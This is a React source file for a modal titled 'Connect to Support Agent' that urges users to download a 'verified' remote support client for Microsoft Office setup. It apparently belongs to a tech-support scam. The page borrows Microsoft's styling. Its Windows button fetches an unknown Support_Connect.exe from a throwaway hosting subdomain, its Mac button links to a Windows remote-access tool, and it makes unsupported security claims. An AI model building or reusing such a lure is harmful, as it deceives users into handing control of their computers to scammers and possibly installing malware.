"use client";

import { motion, AnimatePresence } from "framer-motion";
import { 
  X, 
  ShieldCheck, 
  CheckCircle2, 
  Download, 
  Monitor, 
  Lock, 
  Zap,
  ExternalLink
} from "lucide-react";

interface RemoteSupportModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialTopic?: string;
}

export default function RemoteSupportModal({
  isOpen,
  onClose,
  initialTopic
}: RemoteSupportModalProps) {
  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 overflow-y-auto">
        
        {/* Dark Blurred Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          className="fixed inset-0 bg-slate-950/80 backdrop-blur-md"
        />

        {/* Premium Elevated Dark Modal Container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.94, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.94, y: 20 }}
          transition={{ duration: 0.35, ease: "easeOut" }}
          className="relative w-full max-w-3xl bg-[#090F1E] border border-slate-800/90 text-white rounded-3xl p-7 sm:p-10 shadow-2xl z-10 space-y-8 overflow-hidden"
        >
          {/* Subtle Ambient Radial Glows */}
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[550px] h-[250px] bg-gradient-to-b from-[#0078D4]/25 via-cyan-500/10 to-transparent rounded-full blur-[130px] pointer-events-none select-none" />
          <div className="absolute bottom-0 right-0 w-[300px] h-[300px] bg-emerald-500/10 rounded-full blur-[120px] pointer-events-none select-none" />

          {/* Close button */}
          <button
            onClick={onClose}
            className="absolute top-6 right-6 w-9 h-9 rounded-full bg-slate-900/90 border border-slate-700/80 text-zinc-400 hover:text-white hover:border-slate-500 flex items-center justify-center transition-all cursor-pointer z-20"
          >
            <X className="w-4.5 h-4.5" />
          </button>

          {/* Header Title & Copy */}
          <div className="text-center space-y-3 pt-2 max-w-xl mx-auto relative z-10">
            <h3 className="text-3xl sm:text-4xl lg:text-5xl font-semibold tracking-tight leading-tight text-white">
              Connect to{" "}
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#0078D4] via-blue-400 to-cyan-400 font-semibold">
                Support Agent
              </span>
            </h3>
            <p className="text-xs sm:text-sm text-zinc-300 font-normal leading-relaxed">
              Download our official remote connection client to securely share your session with a <strong className="font-semibold text-white">technical support specialist</strong> for diagnostics, activation, and <strong className="font-semibold text-white">Microsoft Office setup</strong>.
            </p>
          </div>

          {/* Verified Client Badge Pill */}
          <div className="relative z-10 flex items-center justify-center gap-2 text-[11px] font-mono font-semibold uppercase tracking-wider text-blue-300 bg-slate-900/80 p-3 rounded-2xl border border-blue-500/20 shadow-inner">
            <ShieldCheck className="w-4 h-4 text-[#0078D4]" />
            <span>VERIFIED OFFICEATLAS REMOTE SUPPORT CLIENT</span>
          </div>

          {/* 3 Platform Cards Grid with Exact Download Links */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 relative z-10">
            
            {/* 1. Windows Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="bg-slate-900/90 border border-slate-800/90 hover:border-[#0078D4]/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-[#0078D4]/10"
            >
              <div className="w-12 h-12 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-[#0078D4] group-hover:scale-105 transition-transform shadow-xs">
                <svg className="w-6 h-6 fill-current text-[#0078D4]" viewBox="0 0 24 24">
                  <path d="M0 3.449L9.75 2.1v9.451H0m0 1.05h9.75v9.451L0 20.551M10.8 1.95L24 0v11.55H10.8m0 1.05H24V24l-13.2-1.95" />
                </svg>
              </div>

              <div className="space-y-0.5">
                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
                <div className="text-lg font-bold text-white tracking-wide">Windows</div>
              </div>

              <a
                href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-[#0078D4] hover:bg-[#0067b8] text-white text-xs font-semibold rounded-xl shadow-lg shadow-[#0078D4]/25 hover:shadow-xl hover:shadow-[#0078D4]/40 transition-all cursor-pointer"
              >
                <Download className="w-4 h-4" />
                <span>Download →</span>
              </a>
            </motion.div>

            {/* 2. Mac Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="bg-slate-900/90 border border-slate-800/90 hover:border-emerald-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-emerald-500/10"
            >
              <div className="w-12 h-12 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:scale-105 transition-transform shadow-xs">
                <svg className="w-6 h-6 fill-current text-white" viewBox="0 0 24 24">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.32c.64-.78 1.08-1.86.96-2.94-.93.04-2.07.62-2.74 1.4-.6.69-1.13 1.8-.99 2.86 1.05.08 2.13-.54 2.77-1.32z" />
                </svg>
              </div>

              <div className="space-y-0.5">
                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
                <div className="text-lg font-bold text-white tracking-wide">Mac</div>
              </div>

              <a
                href="https://download.teamviewer.com/download/TeamViewerQS_x64.exe"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/40 transition-all cursor-pointer"
              >
                <Download className="w-4 h-4" />
                <span>Download →</span>
              </a>
            </motion.div>

            {/* 3. Chromebook Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="bg-slate-900/90 border border-slate-800/90 hover:border-amber-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-amber-500/10"
            >
              <div className="w-12 h-12 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 group-hover:scale-105 transition-transform shadow-xs">
                <Monitor className="w-6 h-6 text-amber-400" />
              </div>

              <div className="space-y-0.5">
                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
                <div className="text-lg font-bold text-white tracking-wide">Chromebook</div>
              </div>

              <a
                href="https://remotedesktop.google.com/support"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-amber-600/25 hover:shadow-xl hover:shadow-amber-600/40 transition-all cursor-pointer"
              >
                <Download className="w-4 h-4" />
                <span>Download →</span>
              </a>
            </motion.div>

          </div>

          {/* Security Indicators Footer */}
          <div className="pt-5 border-t border-slate-800/90 flex flex-wrap items-center justify-center gap-y-2.5 gap-x-8 text-xs text-zinc-400 font-medium relative z-10">
            <div className="flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              <span>Secure Connection</span>
            </div>
            <div className="flex items-center gap-2">
              <Lock className="w-4 h-4 text-[#0078D4]" />
              <span>256-Bit Encrypted</span>
            </div>
            <div className="flex items-center gap-2">
              <Zap className="w-4 h-4 text-amber-400" />
              <span>Instant Setup</span>
            </div>
          </div>

        </motion.div>
      </div>
    </AnimatePresence>
  );
}
